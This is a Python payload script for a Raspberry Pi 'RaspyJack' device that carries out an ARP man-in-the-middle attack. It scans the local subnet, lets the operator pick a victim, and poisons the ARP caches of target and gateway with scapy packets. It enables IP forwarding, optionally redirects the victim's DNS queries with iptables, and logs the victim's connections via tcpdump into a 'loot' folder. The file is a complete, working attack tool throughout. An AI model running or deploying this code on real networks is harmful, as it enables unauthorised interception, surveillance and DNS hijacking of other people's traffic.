#!/usr/bin/env python3
"""
RaspyJack Payload -- ARP MITM
===============================
Author: 7h30th3r0n3

Dedicated ARP Man-in-the-Middle attack with IP forwarding,
optional DNS interception, and connection logging.

Flow:
  1) ARP scan to discover hosts on subnet
  2) User selects target (UP/DOWN + OK)
  3) Detect gateway IP automatically
  4) Enable IP forwarding
  5) ARP poison target <-> gateway
  6) Optionally intercept DNS queries
  7) Log all connections (src:port -> dst:port)

Controls:
  OK        -- Select target / start attack
  UP / DOWN -- Scroll host list
  KEY1      -- Toggle DNS intercept
  KEY2      -- Export connection log
  KEY3      -- Exit + restore ARP tables

Loot: /root/Raspyjack/loot/ArpMitm/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/ArpMitm"
os.makedirs(LOOT_DIR, exist_ok=True)

ROWS_VISIBLE = 6
ARP_INTERVAL = 2  # seconds between poison packets

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
hosts = []            # list of {"ip": ..., "mac": ...}
scroll_pos = 0
selected_idx = -1
status_msg = "Scanning network..."
view_mode = "hosts"   # hosts | attack | connections
gateway_ip = ""
gateway_mac = ""
target_ip = ""
target_mac = ""
my_mac = ""
my_iface = ""
packets_fwd = 0
dns_intercept = False
attack_running = False
running = True
connections = []      # list of {"ts", "proto", "src", "sport", "dst", "dport"}

_poison_thread = None
_monitor_thread = None
_dns_proc = None

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _run(cmd, timeout=10):
    """Run command and return result."""
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def _run_silent(cmd, timeout=10):
    """Run command ignoring errors."""
    try:
        subprocess.run(cmd, capture_output=True, timeout=timeout)
    except Exception:
        pass


def _get_default_iface():
    """Get the interface with the default route."""
    try:
        result = _run(["ip", "route", "show", "default"])
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_gateway_ip():
    """Get default gateway IP."""
    try:
        result = _run(["ip", "route", "show", "default"])
        for line in result.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return ""


def _get_iface_mac(iface):
    """Read MAC of our interface."""
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except Exception:
        return ""


def _get_subnet(iface):
    """Get subnet in CIDR notation for the interface."""
    try:
        result = _run(["ip", "-4", "addr", "show", "dev", iface])
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1]  # e.g. 192.168.1.5/24
    except Exception:
        pass
    return ""


def _arp_scan(iface, subnet):
    """ARP scan the subnet, return list of {ip, mac}."""
    found = []
    try:
        result = _run(
            ["sudo", "arp-scan", "--interface", iface, subnet],
            timeout=30,
        )
        for line in result.stdout.splitlines():
            match = re.match(
                r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})", line, re.I,
            )
            if match:
                found.append({"ip": match.group(1), "mac": match.group(2).lower()})
    except FileNotFoundError:
        # Fallback: nmap ping scan
        try:
            result = _run(["sudo", "nmap", "-sn", subnet], timeout=30)
            current_ip = ""
            for line in result.stdout.splitlines():
                ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if ip_match:
                    current_ip = ip_match.group(1)
                mac_match = re.search(r"([0-9A-F]{2}(?::[0-9A-F]{2}){5})", line, re.I)
                if mac_match and current_ip:
                    found.append({"ip": current_ip, "mac": mac_match.group(0).lower()})
                    current_ip = ""
        except Exception:
            pass
    except Exception:
        pass
    return found


def _resolve_mac(ip):
    """Resolve IP to MAC via ARP table or arping."""
    # Check ARP cache first
    try:
        result = _run(["arp", "-n", ip])
        match = re.search(r"([0-9a-f:]{17})", result.stdout, re.I)
        if match:
            return match.group(1).lower()
    except Exception:
        pass
    # Arping
    try:
        result = _run(["sudo", "arping", "-c", "1", "-I", my_iface, ip], timeout=5)
        match = re.search(r"\[([0-9a-f:]{17})\]", result.stdout, re.I)
        if match:
            return match.group(1).lower()
    except Exception:
        pass
    return ""


# ---------------------------------------------------------------------------
# ARP poisoning
# ---------------------------------------------------------------------------

def _send_arp_poison(target_ip_addr, target_mac_addr, spoof_ip):
    """Send a single ARP reply: tell target_ip that spoof_ip is at our MAC."""
    try:
        from scapy.all import ARP, Ether, sendp
        pkt = Ether(dst=target_mac_addr) / ARP(
            op=2,
            pdst=target_ip_addr,
            hwdst=target_mac_addr,
            psrc=spoof_ip,
            hwsrc=my_mac,
        )
        sendp(pkt, iface=my_iface, verbose=False)
    except Exception:
        pass


def _send_arp_restore(target_ip_addr, target_mac_addr, real_ip, real_mac):
    """Restore correct ARP entry for target."""
    try:
        from scapy.all import ARP, Ether, sendp
        pkt = Ether(dst=target_mac_addr) / ARP(
            op=2,
            pdst=target_ip_addr,
            hwdst=target_mac_addr,
            psrc=real_ip,
            hwsrc=real_mac,
        )
        sendp(pkt, iface=my_iface, verbose=False, count=5)
    except Exception:
        pass


def _poison_loop():
    """Continuously send ARP poison packets."""
    while running and attack_running:
        _send_arp_poison(target_ip, target_mac, gateway_ip)
        _send_arp_poison(gateway_ip, gateway_mac, target_ip)
        time.sleep(ARP_INTERVAL)


# ---------------------------------------------------------------------------
# Connection monitor thread
# ---------------------------------------------------------------------------

def _connection_monitor():
    """Monitor forwarded traffic and log connections."""
    global packets_fwd
    try:
        proc = subprocess.Popen(
            ["sudo", "tcpdump", "-i", my_iface, "-nn", "-l", "-q",
             f"host {target_ip}"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
        )
    except Exception:
        return

    try:
        for line in iter(proc.stdout.readline, ""):
            if not running or not attack_running:
                break
            with lock:
                packets_fwd += 1

            # Parse: IP src.port > dst.port: proto
            conn_match = re.search(
                r"(\d+\.\d+\.\d+\.\d+)\.(\d+)\s+>\s+(\d+\.\d+\.\d+\.\d+)\.(\d+):\s*(\S+)",
                line,
            )
            if conn_match:
                entry = {
                    "ts": datetime.now().strftime("%H:%M:%S"),
                    "src": conn_match.group(1),
                    "sport": conn_match.group(2),
                    "dst": conn_match.group(3),
                    "dport": conn_match.group(4),
                    "proto": conn_match.group(5),
                }
                with lock:
                    connections.append(entry)
    except Exception:
        pass
    finally:
        if proc.poll() is None:
            proc.terminate()


# ---------------------------------------------------------------------------
# DNS intercept
# ---------------------------------------------------------------------------

def _start_dns_intercept():
    """Redirect DNS queries from target to our Pi via iptables."""
    global _dns_proc
    _run_silent([
        "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
        "-s", target_ip, "-p", "udp", "--dport", "53",
        "-j", "REDIRECT", "--to-port", "53",
    ])
    # Start simple dns responder via dnsmasq
    _dns_proc = None  # iptables redirect is sufficient if Pi runs DNS


def _stop_dns_intercept():
    """Remove DNS interception iptables rules."""
    _run_silent([
        "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
        "-s", target_ip, "-p", "udp", "--dport", "53",
        "-j", "REDIRECT", "--to-port", "53",
    ])
    if _dns_proc and _dns_proc.poll() is None:
        _dns_proc.terminate()


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_log():
    """Export connection log to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target_ip": target_ip,
            "target_mac": target_mac,
            "gateway_ip": gateway_ip,
            "gateway_mac": gateway_mac,
            "packets_forwarded": packets_fwd,
            "connections": list(connections),
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"arp_mitm_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = f"Exported to loot"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "ARP MITM", fill="CYAN", font=font)

    with lock:
        st = status_msg
        vm = view_mode
        sp = scroll_pos
        si = selected_idx
        host_list = list(hosts)
        t_ip = target_ip
        g_ip = gateway_ip
        pf = packets_fwd
        dns_on = dns_intercept
        atk = attack_running
        conn_list = list(connections)

    draw.text((2, 14), st[:22], fill="WHITE", font=font)

    if vm == "hosts":
        y = 28
        for i, h in enumerate(host_list[sp:sp + ROWS_VISIBLE]):
            real_i = sp + i
            prefix = ">" if real_i == si else " "
            color = "YELLOW" if real_i == si else "WHITE"
            line = f"{prefix}{h['ip']}"
            draw.text((2, y), line[:22], fill=color, font=font)
            y += 14
        draw.text((2, 116), "OK=select UP/DN=scroll", fill="GRAY", font=font)

    elif vm == "attack":
        draw.text((2, 28), f"Target: {t_ip}", fill="RED", font=font)
        draw.text((2, 42), f"GW:     {g_ip}", fill="YELLOW", font=font)
        draw.text((2, 56), f"Pkts:   {pf}", fill="WHITE", font=font)
        draw.text((2, 70), f"Conns:  {len(conn_list)}", fill="WHITE", font=font)
        dns_label = "ON" if dns_on else "OFF"
        dns_color = "GREEN" if dns_on else "GRAY"
        draw.text((2, 84), f"DNS:    {dns_label}", fill=dns_color, font=font)
        draw.text((2, 100), "K1=DNS K2=export", fill="GRAY", font=font)
        draw.text((2, 116), "K3=exit+restore ARP", fill="GRAY", font=font)

    elif vm == "connections":
        y = 28
        visible = conn_list[sp:sp + ROWS_VISIBLE]
        for c in visible:
            line = f"{c['src']}:{c['sport']}->{c['dport']}"
            draw.text((2, y), line[:22], fill="WHITE", font=font)
            y += 14
        draw.text((2, 116), "OK=back UP/DN=scroll", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Attack start/stop
# ---------------------------------------------------------------------------

def _start_attack():
    """Begin ARP poisoning."""
    global attack_running, status_msg, _poison_thread, _monitor_thread

    # Enable IP forwarding
    _run_silent(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])

    with lock:
        attack_running = True
        status_msg = "Poisoning..."

    _poison_thread = threading.Thread(target=_poison_loop, daemon=True)
    _poison_thread.start()

    _monitor_thread = threading.Thread(target=_connection_monitor, daemon=True)
    _monitor_thread.start()

    with lock:
        status_msg = "MITM active"


def _stop_attack():
    """Stop poisoning and restore ARP tables."""
    global attack_running, dns_intercept

    with lock:
        attack_running = False

    # Restore ARP tables
    if target_ip and target_mac and gateway_mac:
        _send_arp_restore(target_ip, target_mac, gateway_ip, gateway_mac)
        _send_arp_restore(gateway_ip, gateway_mac, target_ip, target_mac)

    # Remove DNS intercept
    if dns_intercept:
        _stop_dns_intercept()
        with lock:
            dns_intercept = False

    # Disable IP forwarding
    _run_silent(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])

    # Clean iptables
    _run_silent(["sudo", "iptables", "-t", "nat", "-F"])


# ---------------------------------------------------------------------------
# Discovery thread
# ---------------------------------------------------------------------------

def _do_scan():
    """Background network scan."""
    global hosts, scroll_pos, gateway_ip, gateway_mac, my_iface, my_mac
    global status_msg

    iface = _get_default_iface()
    with lock:
        my_iface = iface
        my_mac = _get_iface_mac(iface)

    gw = _get_gateway_ip()
    subnet = _get_subnet(iface)
    if not subnet:
        with lock:
            status_msg = "No subnet found"
        return

    with lock:
        gateway_ip = gw
        status_msg = f"Scanning {subnet}..."

    found = _arp_scan(iface, subnet)
    gw_mac = ""
    for h in found:
        if h["ip"] == gw:
            gw_mac = h["mac"]
            break
    if not gw_mac and gw:
        gw_mac = _resolve_mac(gw)

    with lock:
        gateway_mac = gw_mac
        hosts = [h for h in found if h["ip"] != gw]
        scroll_pos = 0
        status_msg = f"Found {len(hosts)} hosts (GW: {gw})"


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    global running, scroll_pos, selected_idx, view_mode, dns_intercept
    global target_ip, target_mac, status_msg

    try:
        _draw_screen()

        # Start initial scan
        scan_thread = threading.Thread(target=_do_scan, daemon=True)
        scan_thread.start()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    vm = view_mode
                    si = selected_idx
                    atk = attack_running
                    host_list = list(hosts)

                if vm == "hosts" and 0 <= si < len(host_list):
                    with lock:
                        target_ip = host_list[si]["ip"]
                        target_mac = host_list[si]["mac"]
                        view_mode = "attack"
                        status_msg = "Starting MITM..."
                    threading.Thread(target=_start_attack, daemon=True).start()
                elif vm == "connections":
                    with lock:
                        view_mode = "attack"
                        scroll_pos = 0

            elif btn == "UP":
                with lock:
                    if view_mode == "hosts":
                        if selected_idx > 0:
                            selected_idx -= 1
                        if selected_idx < scroll_pos:
                            scroll_pos = selected_idx
                    else:
                        if scroll_pos > 0:
                            scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    if view_mode == "hosts":
                        if selected_idx < len(hosts) - 1:
                            selected_idx += 1
                        if selected_idx >= scroll_pos + ROWS_VISIBLE:
                            scroll_pos = selected_idx - ROWS_VISIBLE + 1
                    elif view_mode == "attack":
                        view_mode = "connections"
                        scroll_pos = 0
                    elif view_mode == "connections":
                        max_s = max(0, len(connections) - ROWS_VISIBLE)
                        if scroll_pos < max_s:
                            scroll_pos += 1

            elif btn == "KEY1":
                with lock:
                    if attack_running:
                        dns_intercept = not dns_intercept
                if dns_intercept:
                    threading.Thread(
                        target=_start_dns_intercept, daemon=True,
                    ).start()
                else:
                    threading.Thread(
                        target=_stop_dns_intercept, daemon=True,
                    ).start()

            elif btn == "KEY2":
                threading.Thread(target=_export_log, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False

        if attack_running:
            _stop_attack()

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 50), "ARP restored", fill="YELLOW", font=font)
            draw.text((10, 66), "MITM stopped", fill="RED", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()


if __name__ == "__main__":
    main()
